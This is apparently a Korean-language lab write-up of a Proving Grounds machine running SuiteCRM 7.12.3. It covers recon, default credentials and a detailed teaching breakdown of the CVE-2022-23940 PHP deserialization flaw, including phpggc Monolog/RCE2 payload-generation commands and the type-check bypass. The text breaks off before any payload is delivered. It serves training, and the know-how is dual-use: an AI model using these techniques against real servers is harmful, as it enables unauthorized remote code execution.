---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/deserialization
  - tech/web/default-creds
  - tech/lin/sudo-abuse
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.146
ports: [22, 80, 3306, 33060]
services: [http, mysql, mysqlx, ssh]
cves: [CVE-2022-23940]
status: solved
manual_tags: true
tech_count: 6
---
> [!info] PG Practice — Pentester Foundations #1
> **타겟** 192.168.248.146 · **OS** Debian 10 (buster) · **난이도** Intermediate · **플래그 2개**
> **경로 요약** SuiteCRM 7.12.3 기본자격(admin:admin) → CVE-2022-23940 인증 후 RCE → `www-data` → `sudo service` 경로탈출 → `root`

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 이 노트는 [[_WRITEUP-STANDARD#적대적 검증 — 노트를 쓴 다음 반드시 거친다|적대적 검증]]을 거쳐 **12건**을 정정했다. **실측 터미널 블록은 훼손되지 않았고, 틀린 것은 전부 나중에 덧붙인 설명 문장**이었다. 다시 읽을 때 같은 오해를 반복하지 않도록 요약해둔다.
>
> | 무엇이 틀렸었나 | 무엇이 사실인가 | 반증 근거 |
> |---|---|---|
> | "`rest_data`를 빼면 SuiteCRM이 오류를 낸다" | **필수는 `method` 하나**. `rest_data`는 없으면 빈 문자열로 조용히 폴백 | v7.12.3 `SugarRestJSON.php` |
> | "dash에서 `/dev/tcp: No such file or directory`가 난다" | 실제는 **`Syntax error: Bad fd number`**. `/dev/tcp`에 도달조차 못 한다 | Kali 실행 |
> | "`save()`가 base64 디코드 후 `unserialize()`한다" | `save()`는 **인코드**한다. 진짜 버그는 **`is_array()` 타입 검사 우회** → 조회 경로 `get_email_recipients()`의 `unserialize()` | PoC README의 벤더 코드 |
> | 가젯 체인 최상위 = `BufferHandler` | 최상위는 **`SyslogUdpHandler`**, `BufferHandler`는 그 `$socket` | `exploit.py:12` 하드코딩 페이로드 |
> | `/install/` 리스팅·`status.json`·내부 IP `172.16.201.78` | **산출물에 근거 없음.** `ferox.log` 1085행에 해당 히트 0건, `install.log`에 `172.16.*` 0건 | `~/PG/Crane/ferox.log`·`install.log` |
> | "`AOR_Scheduled_Reports`는 관리자만" | **예약 보고서 생성 권한이 있는 임의 계정** | PoC README |
> | "RST = 방화벽이 없다" | RST는 **묵살형(DROP) 차단이 없다**까지만 말한다. REJECT 규칙도 RST를 준다 | — |
> | "공개 PoC는 OSCP 회색지대" | **허용된다.** 금지 정의는 "스스로 발견하고 익스플로잇하는" 도구 | OffSec 공식 정의 |
> | MySQL "`root`가 `localhost`에서만 붙는다" | `mysql.user`를 조회한 적이 없다 → `[가정]`으로 강등 | — |
>
> **원칙**: 이 노트에서 `[가정]` 딱지가 없는 단정은 실측이거나 1차 사료로 확인한 것이다. 딱지가 붙은 것은 확인하지 못했다는 뜻이다.

## 0. 이 박스에서 배우는 것

- **비인증 엔드포인트로 제품 버전을 확정하는 법** — SuiteCRM은 `/service/v4_1/rest.php`의 `get_server_info`가 인증 없이 버전을 뱉는다. **버전 특정이 곧 CVE 특정**이다
- **`searchsploit`에 없다 = 취약점이 없다가 아니다** — 버전을 잡았으면 **CVE 번호로 다시 검색**해서 GitHub PoC를 찾는다
- **PHP 객체 역직렬화가 왜 RCE가 되는가** — 매직 메서드(`__destruct`/`__wakeup`)와 **POP 체인**, 그리고 phpggc라는 도구가 무엇을 대신해주는가
- **응답이 없는 것이 실패를 뜻하지 않는다** — 익스플로잇이 "행(hang)"에 걸린 것처럼 보여도 **리스너에는 이미 셸이 붙어 있다**
- **`sudo` 규칙에서 인자 문자열이 경로로 이어붙는 프로그램은 전부 탈출구다** — `service`가 GTFOBins에 오른 이유가 정확히 이 메커니즘이다

> [!tip] 시험 출제 가능성
> **높다.** 다만 CVE-2022-23940 자체가 나올 확률은 낮고, **같은 골격**이 나온다:
> 1. 웹 제품 하나 + **기본 자격증명 또는 약한 자격증명**
> 2. **인증 후(post-auth) 공개 CVE** — 역직렬화·템플릿 인젝션·파일 업로드 중 하나
> 3. 웹 사용자(`www-data`) 셸 → **`sudo -l` 한 줄로 끝나는 GTFOBins 권한상승**
>
> 변형 예상: SuiteCRM 대신 **Laravel(`Ignition`/`APP_KEY` 유출) · Drupal · Magento · Zabbix · Cacti · phpMyAdmin**. 권한상승 쪽은 `service` 자리에 **`tar`·`zip`·`awk`·`vim`·`git`·`env`·`find`**가 들어간다.
> **PHP 역직렬화는 개념 자체가 출제 대상**이다 — 이 노트의 2장은 CVE가 아니라 유형을 익히기 위한 것이다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.146
Nmap scan report for 192.168.248.146
Host is up (0.094s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx  MySQL X protocol listener
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   93.59 ms 192.168.45.1
2   93.56 ms 192.168.45.254
3   93.70 ms 192.168.251.1
4   93.81 ms 192.168.248.146

Nmap done at Wed Aug 19 16:49:57 2026 -- 1 IP address (1 host up) scanned in 30.90 seconds
```

*(위는 `nmap.log` 발췌다 — 선두의 `# Nmap ... initiated` 명령줄, 말미의 `OS and Service detection performed ...` 안내, `# Nmap done`의 `#` 접두가 생략돼 있다. 값 자체는 원문과 일치한다.)*

공격면은 사실상 **80번 하나**다. 3306은 원격 접속 허용 목록에 없어 `MySQL (unauthorized)`로 튕기고, SMB/NFS/RPC는 전수 스캔에서 전부 closed였다.

> [!note] 이 스캔 결과에서 읽어야 할 줄
> | 줄 | 의미 |
> |---|---|
> | `Not shown: 65531 closed tcp ports (reset)` | **필터링(DROP)이 아니라 RST 응답**이다. 확정되는 것은 **① 묵살형 인라인 차단이 없다 ② 숨은 고번호 포트가 없다** 두 가지뿐 ([[Hawat]]처럼 웹이 50080에 숨은 경우와 대조). ⚠️ **"방화벽이 없다"의 증거는 아니다** — `iptables -j REJECT --reject-with tcp-reset`, 방화벽 장비의 reject 정책, 클라우드 보안그룹 전부 RST를 돌려준다. RST와 `filtered`의 차이는 **차단 방식**이지 차단 유무가 아니다 |
> | `http-title: SuiteCRM` | 제품이 즉시 특정됐다. 이 시점부터 할 일은 **버전 확정 → CVE 검색** 하나뿐이다 |
> | `MySQL (unauthorized)` | 포트는 열렸지만 **내 IP가 `mysql.user` 호스트 목록에 없다.** 자격증명을 알아도 원격 로그인은 안 된다 — 나중에 config.php에서 `root`/빈 패스워드를 얻어도 이 줄 때문에 외부에서는 못 쓴다 |
> | `httponly flag not set` | 세션 탈취 XSS 가능성 신호. 이 박스에서는 쓰이지 않았다 |

> [!tip] 플래그 해설 — 왜 이 조합인가
> | 플래그 | 역할 | 빼면 어떻게 되는가 |
> |---|---|---|
> | `-p-` | 1~65535 전수 | 기본 1000포트만 본다. **웹이 고번호에 숨은 박스는 통째로 놓친다** |
> | `-Pn` | 호스트 발견 생략 | ICMP를 막는 랩 타겟이면 "host down"으로 스캔이 **시작조차 안 된다** |
> | `-sCV` | 기본 NSE + 버전 탐지 | `http-title`·`http-robots.txt`가 안 나온다. 이 박스는 **`http-title: SuiteCRM` 한 줄이 시작점**이었다 |
> | `--min-rate 5000` | 초당 최소 패킷 | 없으면 `-p-`가 수십 분 간다. 24시간 시험에서 치명적 |
> | `-oN nmap.log` | 원문 저장 | 보고서 증빙과 재확인용. 스크롤백은 사라진다 |

### 서비스 식별 — 버전 확정

루트가 `index.php?action=Login&module=Users`로 301 리다이렉트, 타이틀은 `SuiteCRM`.
버전은 **인증 없이 REST API가 그대로 뱉는다** — 이게 가장 빠른 확정 경로다.

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ curl -s "http://192.168.248.146/service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON&rest_data=%7B%7D"
{"flavor":"CE","version":"6.5.25","suitecrm_version":"7.12.3","gmt_time":"2026-08-19 07:53:08"}
```

`/README.md` 선두의 `# SuiteCRM 7.12.3` 헤딩으로 교차 확인. → **SuiteCRM 7.12.3 CE** (Sugar 6.5.25 기반)
(v7.12.3 태그의 `README.md`는 1~3행이 `suitecrm.com` 로고 링크이고 버전 헤딩은 그 아래에 온다. **"1행"이라고 외우지 말고 `head -10`으로 본다.**)

> [!tip] 열거 포인트
> SuiteCRM은 `/service/v4_1/rest.php`의 `get_server_info`가 **비인증**이다. 버전 특정이 곧 CVE 특정이므로 SuiteCRM을 만나면 이걸 먼저 친다.

> [!note] 버전 판정은 독립 근거 2개 — 여기서도 지켰다
> 1. REST `get_server_info` → `suitecrm_version: 7.12.3`
> 2. `/README.md` 선두 헤딩 → `# SuiteCRM 7.12.3`
>
> `version: 6.5.25`에 낚이면 안 된다. 이건 **SuiteCRM이 포크한 SugarCRM CE의 기반 버전**이지 제품 버전이 아니다. CVE 매칭은 `suitecrm_version` 쪽으로 해야 한다.
> 같은 패턴: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]]

`rest_data=%7B%7D`는 `{}`(빈 JSON 객체)의 URL 인코딩이다.

> [!warning] 4개를 다 붙이는 건 습관이지 필수 조건이 아니다 — 소스로 확인했다
> 흔한 오해가 "`method`·`input_type`·`response_type`·`rest_data` 4개가 모두 있어야 응답한다"인데 **틀렸다.** v7.12.3 태그의 `service/core/REST/SugarRestJSON.php`를 열면:
>
> ```php
> $json_data = !empty($_REQUEST['rest_data'])? $GLOBALS['RAW_REQUEST']['rest_data']: '';
> ```
>
> `rest_data`가 없으면 **fault 없이 빈 문자열로 폴백**한다. `input_type`/`response_type`도 서비스 생성자에 기본값이 있다.
> **fault를 내는 것은 `method` 하나뿐**이다 — `if(empty($_REQUEST['method']) || !method_exists(...))` 분기에서만 에러가 난다.
>
> 실전적 함의: **파라미터가 안 먹을 때 "필수 파라미터가 빠졌나"부터 의심하지 마라.** 어느 파라미터가 진짜 필수인지는 **엔트리포인트 소스 한 파일**이면 확정된다. 제품이 GitHub에 있으면 **해당 태그**를 봐야 한다 — main 브랜치는 이미 달라져 있다.

robots.txt:
```
User-agent: *
Disallow: /

User-agent: Googlebot
Allow: /ical_server.php
```

### 열거 — feroxbuster

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ feroxbuster -u http://192.168.248.146/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100 -o ferox.log
```

결과 1085행 대부분이 `themes/`·`cache/`·`vendor/` 정적 자산 노이즈다. 유의미한 것만:

```
301  GET  /  => index.php?action=Login&module=Users
301  GET  /custom, /vendor, /modules, /service, /custom/modules, /custom/application
301  GET  /modules/Administration, /modules/Home, /modules/Help
200  GET  /maintenance.php  (47c)
200  GET  /export.php, /pdf.php  (23c = "Not A Valid Entry Point")
200  GET  /service/v2/rest.php, /service/v4/rest.php, /service/v4_1/rest.php
200  GET  /service/v2/soap.php ~ /service/v4_1/soap.php
200  GET  /service/example/test.html, /service/example/example.html
401  GET  /ical_server.php   (X-Dav-Powered-By: HTTP_WebDAV_Server_iCal)
500  GET  /cron.php, /service/core/Sugar*.php, /service/v4{,_1}/registry.php
```

> [!warning] 스캐너 함정 — 상태코드만 보면 오독한다
> - **`200 (23c) = "Not A Valid Entry Point"`** — 200인데 **거부 응답**이다. 크기(23바이트)를 안 보면 "노출된 엔드포인트"로 착각한다. **feroxbuster/gobuster 결과는 상태코드가 아니라 응답 길이로 1차 분류**한다
> - **`500`** — 서버 오류지 "막혔다"가 아니다. `cron.php`가 CLI 전용이라 웹에서 부팅에 실패한 것뿐
> - **1085행 중 유의미한 것은 20행 미만**이다. CMS를 상대로 한 디렉터리 브루트포스는 대부분 vendor 노이즈다. **제품이 특정된 순간 브루트포스의 우선순위는 내려간다**
>
> 같은 계열의 착시: [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — **"응답이 성공을 뜻하지 않는다"**

노출된 파일 중 눈여겨볼 것:

| 경로 | 상태 | 내용 | 근거 |
|---|---|---|---|
| `/install.log` | 200, 51KB | 설치일 **2023-08-24**, DB 드라이버·XML 파서 부재 ERROR 기록. **평문 자격증명 없음** | ✅ 실측 — `~/PG/Crane/install.log` **51295바이트**, 전수 grep 결과 자격증명 0건 |
| `/install.php` | 200 | `installer_locked => true` — 재설치 불가 | `[가정 — 산출물 미보존]` |
| `/config.php`, `/config_override.php` | 200, 0바이트 | PHP 파싱됨, 유출 없음 | `[가정 — 산출물 미보존]` |

> [!danger] 반증됨 — 여기 원래 세 줄이 더 있었다 (2026-08-20 적대적 검증)
> 이 노트는 원래 아래 세 항목을 **실측인 것처럼** 적고 있었다. **산출물이 전부 반박한다.**
>
> | 원래 서술 | 반증 |
> |---|---|
> | `/install/` 200, **디렉터리 리스팅 활성** (인스톨러 전체 노출) | `ferox.log` **1085행 전량에 `/install` 히트 0건.** 워드리스트 `raft-medium-directories.txt`에는 `install`이 **51행에 실재**하므로 200이었다면 반드시 찍혔다. 게다가 feroxbuster의 `detected directory listing` 휴리스틱은 같은 스캔에서 `/themes`·`/cache`에 **실제로 발화**했다 — `/install`에는 발화하지 않았다 |
> | `/install/status.json` → **내부 IP `172.16.201.78`** 누출 | `install.log` 전수 grep에 **`172.16.*` 0건.** 이 IP는 산출물 어디에도 없다 |
> | `/upload/` 200, 리스팅 없음 | `ferox.log`에 `/upload` 히트 0건 (워드리스트 88행에 `upload` 실재) |
>
> **왜 남겨두는가**: 지우면 "왜 뒤집혔는지"가 사라져 같은 실수를 반복한다. 그리고 이것 자체가 교훈이다 —
> **디렉터리 브루트포스 결과를 서술할 때는 로그를 다시 열어라.** "인스톨러가 노출돼 있었던 것 같다"는 기억은 CMS 정찰에서 **너무 그럴듯해서** 검증 없이 통과한다.
>
> 아래 6장 ③·7장 12번·8장 방어 표에서 이 전제 위에 서 있던 서술도 함께 정정했다.

`/install.log`는 51KB짜리 설치 로그가 그대로 서빙되는 **정보 노출**이지만, 안에 있는 것은 **DB 드라이버 부재 에러와 설치 진행 로그**뿐이다. 자격증명은 없다. **함정에 가깝다.**

> [!note] `/config.php`가 0바이트인 것은 좋은 신호가 아니다
> PHP 파일을 요청해서 **0바이트가 오면 서버가 정상적으로 파싱**했다는 뜻이다(출력이 없는 순수 배열 정의 파일이므로). 만약 여기서 **평문이 그대로 보였다면** PHP 핸들러가 죽은 것이고, 그 자체가 DB 자격증명 유출이 된다.
> **PHP 앱을 만나면 `config.php`·`config.inc.php`·`.env`·`config.php.bak`·`config.php~`를 반드시 찔러본다.** `.bak`/`~`/`.old` 확장자는 PHP로 파싱되지 않아 **평문으로 떨어진다** — feroxbuster의 `-x php,txt,html,bak,zip`에 `bak`을 넣은 이유가 이것이다.

### searchsploit — 왜 DB 결과를 그대로 믿으면 안 되는가

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ searchsploit suitecrm
SuiteCRM 7.10.7  - 'parentTab' SQL Injection          | php/webapps/46310.txt
SuiteCRM 7.10.7  - 'record' SQL Injection             | php/webapps/46311.txt
SuiteCRM 7.11.15 - 'last_name' Remote Code Execution  | php/webapps/49001.py
SuiteCRM 7.11.18 - Remote Code Execution (RCE)        | php/webapps/50531.rb
```

전부 **7.12.3보다 낮은** 버전 대상이다. 타겟 버전 7.12.3에 맞는 것은 exploit-db가 아니라 **CVE-2022-23940** (7.12.5에서 패치) 쪽이고, GitHub PoC를 써야 한다.

> [!warning] 교훈
> `searchsploit`에 안 나온다고 취약점이 없는 게 아니다. 버전을 특정했으면 **CVE 번호로 다시 검색**한다.

> [!tip] 버전을 잡은 뒤의 검색 순서 (고정 루틴)
> 1. `searchsploit <제품>` — exploit-db 로컬 DB. **가장 빠르지만 가장 안 나온다**
> 2. `searchsploit -u` — DB가 오래됐으면 결과가 비는 게 당연하다
> 3. **`<제품> <버전> CVE`** 웹 검색 → NVD/보안 어드바이저리에서 CVE 번호 확보
> 4. **`CVE-XXXX-XXXXX github`** → PoC 저장소
> 5. 제품 GitHub의 **릴리스 노트/커밋 diff** — "무엇을 고쳤는가"가 곧 "무엇이 취약한가"다
>
> 3~5번을 건너뛰면 이 박스는 못 푼다. **exploit-db는 공개 익스플로잇의 일부일 뿐**이라는 사실을 몸에 새길 것.

---

## 2. 취약점 분석

> [!abstract] 이 장에서 다루는 것
> CVE-2022-23940은 **인증 후 PHP 객체 역직렬화(PHP Object Injection)** 취약점이다.
> 페이로드만 복사하면 이 박스는 5분이면 끝나지만, 그러면 **다음 박스에서 같은 유형을 못 알아본다.**
> 아래는 세 단계로 나눠 설명한다 — ① 역직렬화가 대체 무엇인가 → ② SuiteCRM 코드의 어디가 어떻게 뚫리는가 → ③ 우리가 던진 페이로드의 각 조각이 무슨 일을 하는가.

### 2-1. 배경 지식 — PHP 역직렬화가 왜 코드 실행이 되는가

**직렬화(serialization)** 는 메모리 안의 객체를 저장·전송 가능한 문자열로 바꾸는 것이다. PHP에서는 `serialize()` / `unserialize()` 한 쌍이 담당한다.

```php
class User { public $name = "alice"; public $admin = false; }
echo serialize(new User);
// O:4:"User":2:{s:4:"name";s:5:"alice";s:5:"admin";b:0;}
```

포맷을 읽는 법 — **이걸 읽을 줄 알아야 페이로드를 손으로 고칠 수 있다**:

| 조각 | 뜻 |
|---|---|
| `O:4:"User"` | **O**bject, 클래스명 길이 4, 클래스명 `User` |
| `:2:` | 프로퍼티 2개 |
| `s:4:"name"` | **s**tring, 길이 4, 값 `name` (프로퍼티 이름) |
| `s:5:"alice"` | 그 프로퍼티의 값 |
| `b:0` | **b**oolean false |
| 그 외 | `i:` 정수 · `a:` 배열 · `N;` null |

> [!danger] 핵심 — `unserialize()`는 "데이터만 복원"하지 않는다
> 초심자의 오해: *"객체를 문자열에서 되살리는 것뿐인데 왜 코드가 실행되나?"*
>
> PHP에는 **매직 메서드(magic method)** 가 있다. 특정 사건이 일어나면 **개발자가 부르지 않아도 자동으로 실행되는 메서드**다.
>
> | 매직 메서드 | 자동 호출 시점 |
> |---|---|
> | `__construct()` | `new`로 생성할 때 — **`unserialize()`에서는 호출되지 않는다** |
> | `__wakeup()` | **`unserialize()` 직후** |
> | `__destruct()` | 객체가 **소멸**할 때(스크립트 종료·참조 해제) — **반드시 실행된다** |
> | `__toString()` | 객체를 문자열로 쓸 때 (`echo $obj`, 문자열 연결) |
> | `__get()` / `__set()` | 없는 프로퍼티에 접근할 때 |
> | `__call()` / `__invoke()` | 없는 메서드 호출 / 객체를 함수처럼 호출할 때 |
>
> 즉 **공격자가 클래스명과 프로퍼티 값을 정할 수 있으면, 그 클래스의 `__destruct`/`__wakeup` 안에 있는 코드가 공격자가 정한 데이터로 실행된다.**
> `__destruct`는 특히 위험하다 — 예외가 나든 스크립트가 끝나든 **어차피 불린다.** 방어할 여지가 없다.

**POP 체인(Property-Oriented Programming chain)**

현실의 애플리케이션에 `__destruct() { system($this->cmd); }` 같은 친절한 클래스가 있을 리 없다. 대신 이렇게 이어붙인다:

```
A::__destruct()          → $this->handler->flush()      를 부른다
   └ B::flush()          → $this->target->write($data)  를 부른다
        └ C::write()     → call_user_func($this->fn, $arg)  ← 여기서 터진다
```

`A`의 프로퍼티에 `B` 객체를, `B`의 프로퍼티에 `C` 객체를 **중첩해서 직렬화 문자열에 넣어두면**, `__destruct` 하나가 도미노처럼 끝까지 굴러간다. 각 단계는 그 자체로는 정상 코드다 — **위험한 것은 조합**이다. 이 조합을 **가젯 체인(gadget chain)** 이라 부른다.

> [!note] 왜 라이브러리가 표적이 되는가
> 가젯은 **애플리케이션 자기 코드가 아니라 `vendor/` 안의 라이브러리**에서 나온다. Composer로 설치되는 Monolog·Guzzle·Laravel·Symfony·Doctrine·PHPUnit(개발 의존성이 배포에 섞이는 사고가 잦다)이 단골이다.
> **그래서 "이 앱에는 위험한 클래스가 없다"는 방어는 성립하지 않는다.** `vendor/` 전체가 공격 표면이다.
> 같은 개념이 다른 언어에도 있다 — Java `readObject()`(ysoserial), .NET `BinaryFormatter`, Python `pickle`, Ruby `Marshal.load`. **`pickle.loads(사용자입력)`을 보면 즉시 RCE를 의심하는 반사**와 동일하다.

**phpggc의 역할**

가젯 체인을 손으로 만들려면 `vendor/` 전체를 읽고 매직 메서드에서 시작하는 호출 그래프를 추적해야 한다. [phpggc](https://github.com/ambionics/phpggc)는 **주요 라이브러리의 알려진 체인을 미리 구현해둔 생성기**다.

```bash
phpggc -l monolog                    # Monolog용 체인 목록
phpggc Monolog/RCE2 system 'id'      # 체인 생성 (직렬화 문자열이 stdout으로)
phpggc Monolog/RCE2 system 'id' -b   # base64로 인코딩해서 출력
```

`-b` 플래그가 중요하다 — 직렬화 문자열에는 `"`·`;`·`{`·`}`·널바이트가 섞여 HTTP 파라미터로 그냥 넣으면 깨진다. **이 취약점은 애초에 서버가 base64를 기대**하므로 `-b`가 그대로 맞물린다.

> [!warning] phpggc는 "익스플로잇"이 아니라 "페이로드 생성기"다
> 취약한 엔드포인트에 **전달하는 일은 직접** 해야 한다. 그래서 phpggc는 msfvenom과 같은 범주 — **OSCP에서 사용 가능한 도구**다. 시험 금지 정의는 *"automatically **discovering and exploiting** … without effort or enumeration"* 인데 phpggc는 **타겟과 통신조차 하지 않는다.**
> 같은 기준으로 3-2의 `exploit.py`도 **허용된다** — 특정 CVE 하나를 겨냥한 PoC는 취약점을 스스로 발견하지 않기 때문이다. (이 노트는 원래 `exploit.py`를 "회색지대"로 적어놨었다. 과잉 해석이라 정정했다 — 3-2 참조.)
> 다만 **손으로 재구성할 수 있어야** 스크립트가 죽었을 때 살아남는다. 그것이 대안 절차를 함께 적어두는 이유다.

### 2-2. 왜 취약한가 — CVE-2022-23940의 데이터 흐름

취약점 위치는 `AOR_Scheduled_Reports` 모듈이다. 그런데 **흔히 하는 요약이 틀렸다** — "저장할 때 base64 디코드하고 `unserialize()` 한다"가 아니다. **1차 사료**(PoC 저장소 `~/PG/Crane/CVE-2022-23940/README.md`가 인용한 벤더 코드)를 보자:

```php
// modules/AOR_Scheduled_Reports/AOR_Scheduled_Reports.php

public function save($check_notify = false)
{
    if (isset($_POST['email_recipients']) && is_array($_POST['email_recipients'])) {
        $this->email_recipients = base64_encode(serialize($_POST['email_recipients']));
    }
    return parent::save($check_notify);
}

public function get_email_recipients()
{
    $params = unserialize(base64_decode($this->email_recipients));
    // ...
}
```

`save()`는 **디코드하지 않는다 — 인코드한다.** 두 함수를 나란히 놓으면 진짜 버그가 보인다.

> [!danger] 이 박스의 핵심 교훈 — 타입 검사로 보호되는 sink는 **반대 타입**으로 우회한다
> `save()`는 `is_array($_POST['email_recipients'])` **일 때만** 직렬화+인코딩을 수행한다. 개발자의 암묵적 전제는 **"이 컬럼에는 항상 우리가 만든 base64(serialize(배열))만 들어간다"** 이다.
>
> 공격자가 `email_recipients`를 **배열이 아니라 스칼라 문자열**로 보내면:
>
> | | `email_recipients[]=a&email_recipients[]=b` (배열) | `email_recipients=<공격자 문자열>` (스칼라) |
> |---|---|---|
> | `is_array()` | true | **false** |
> | 실행되는 분기 | `base64_encode(serialize(...))` — 서버가 값을 **재생성** | **분기 자체를 건너뛴다** |
> | DB에 저장되는 것 | 서버가 만든 안전한 값 | **공격자 입력 원문 그대로** |
>
> 즉 **검사를 통과하는 것이 아니라, 검사가 붙은 분기를 통째로 우회**하는 것이다. 그리고 나중에 **조회 경로**인 `get_email_recipients()`가 그 컬럼을 `unserialize(base64_decode(...))` 한다. PoC README의 표현 그대로 — *"The server incorrectly assumes that the `email_recipients` parameter is always an array."*
>
> **일반화**: `is_array()`·`is_string()`·`is_numeric()`·`isset()` 같은 **타입/존재 검사로 감싸인 정규화 코드**를 보면, **반대 타입을 보내 그 코드를 건너뛸 수 있는지** 먼저 본다. PHP는 `a[]=1`(배열)과 `a=1`(문자열)을 **같은 HTTP 파라미터 문법으로 둘 다 표현**할 수 있어서 이 우회가 유독 쉽다. 같은 성질을 쓰는 다른 고전 사례: `strcmp($pw, $_POST['pw'])`에 배열을 보내 `NULL`(=`0`으로 느슨 비교) 반환을 유도하는 인증 우회.
>
> **그리고 저장과 발화가 다른 함수·다른 요청에서 일어난다** — 이것이 **2차(저장형) 역직렬화**다. 저장 시점에는 아무 일도 안 일어나므로 "페이로드를 보냈는데 반응이 없다"가 실패로 보인다. **트리거 경로를 따로 쳐야 한다는 사실을 알고 있어야 한다.**

데이터가 흐르는 경로를 단계로 끊으면 이렇다:

| # | 단계 | 무슨 일이 일어나는가 |
|---|---|---|
| 1 | `POST /index.php` `module=AOR_Scheduled_Reports&action=Save` | 예약 보고서 생성 권한이 있는 세션으로 저장 요청 |
| 2 | 폼 필드 `email_recipients`를 **배열이 아니라 문자열로** 보낸다 | 정상 UI는 수신자 체크박스 여러 개를 **배열**로 보낸다. 우리는 스칼라 하나를 보낸다 |
| 3 | `save()`의 `is_array()` 검사 | **false → 정규화 분기를 건너뛴다.** 값이 손대지 않은 채 통과 |
| 4 | `parent::save()` → DB `aor_scheduled_reports.email_recipients` 컬럼 | **공격자 입력이 원문 그대로 저장**된다 (여기까지는 아무 일도 안 일어난다) |
| 5 | 조회 경로 `get_email_recipients()` | `unserialize(base64_decode($this->email_recipients))` ← **진짜 sink** |
| 6 | 문자열 → 임의 클래스의 객체 그래프 | Monolog 클래스들이 복원된다 |
| 7 | 요청 처리 종료 → 객체 소멸 | **`__destruct()` 자동 발화** |
| 8 | Monolog 가젯 체인 | `__destruct` → … → `call_user_func('system', $cmd)` |

SuiteCRM은 Monolog를 번들하고 있으므로 phpggc의 `Monolog/RCE2` 계열 가젯 체인이 그대로 먹는다.

> [!danger] 이 취약점의 본질은 한 줄이다
> ```php
> $params = unserialize(base64_decode($this->email_recipients));  // DB 컬럼 = 신뢰 경계 밖의 입력
> ```
> **DB에서 읽었다고 신뢰 경계 안이 아니다.** 그 컬럼에 무엇이 들어갔는지를 결정한 것은 앞 단계의 `save()`이고, 거기에 우회 가능한 타입 검사가 있었다.
> **`unserialize()`에 사용자 입력이 도달하면, 그 자체로 취약**하다. 필터링으로는 못 막는다 — 유효한 직렬화 문자열의 형태는 무한하고, 공격자는 `vendor/`의 어떤 클래스든 지정할 수 있다.
> 근본 대책은 하나뿐: **사용자 데이터에 `unserialize()`를 쓰지 않는다.** `json_decode()`처럼 **객체를 되살리지 않는** 포맷을 쓴다.
> PHP 7 이상에는 `unserialize($data, ['allowed_classes' => false])` 옵션이 있지만, 이건 이미 설계가 틀어진 뒤의 완충재다.

**전제조건 — 왜 인증이 필요한가.** `AOR_Scheduled_Reports` 저장 경로는 **인증된 세션**을 요구한다. 그래서 이 CVE는 단독으로는 쓸모가 없고, **자격증명 확보가 선행 조건**이다. 이 박스에서 그 조건을 `admin:admin`이 채워줬다.

> [!warning] "관리자 전용"이 아니다 — 필요한 것은 **예약 보고서 생성 권한**뿐
> PoC 저장소 README 원문: *"any user with permission to create Scheduled Reports can obtain remote code execution and compromise the server."*
> 즉 **관리자가 아니어도 `AOR_Scheduled_Reports` 모듈에 레코드를 만들 수 있는 계정이면 전부 발화**한다.
> 실전 함의가 크다 — **저권한 계정 하나만 주워도 이 CVE는 살아 있다.** "관리자 자격증명이 없으니 이 CVE는 포기"라고 판단하면 경로를 통째로 버린다.
> **일반화: post-auth CVE를 만나면 "인증이 필요한가"가 아니라 "어떤 권한이 필요한가"를 어드바이저리/PoC 원문에서 확인하라.** 대개 생각보다 낮다.

> [!tip] "인증 후 RCE" CVE를 만나면 순서가 뒤집힌다
> 보통은 *취약점 찾기 → 익스플로잇*이지만, post-auth CVE에서는 **자격증명 확보가 먼저**다.
> 그래서 이 박스의 실제 정답 순서는 **① 기본 자격증명 시도 → ② CVE 발사**였다. CVE를 먼저 던지고 "안 되네"라고 판단하면 시간을 태운다.
> 웹 제품을 만나면 **CVE를 뒤지기 전에 `admin:admin`·`admin:password`·`admin:<제품명>`·`root:root`를 먼저 친다.** 30초면 된다.

**패치.** 7.12.5에서 수정됐다. 즉 **7.12.4 이하가 취약**하고, 타겟 7.12.3은 정확히 그 범위 안이다.

### 2-3. 왜 이 페이로드인가 — Monolog/RCE2 체인 해부

우리가 최종적으로 던진 것은 **세 겹으로 포개진 페이로드**다. 안쪽부터 벗겨보면:

| 겹 | 내용 | 왜 이 겹이 필요한가 |
|---|---|---|
| ③ 바깥 | `serialize()` 된 Monolog 객체 그래프 → **base64** | 서버가 `base64_decode → unserialize` 하므로 **이 형식이어야만 발화**한다 |
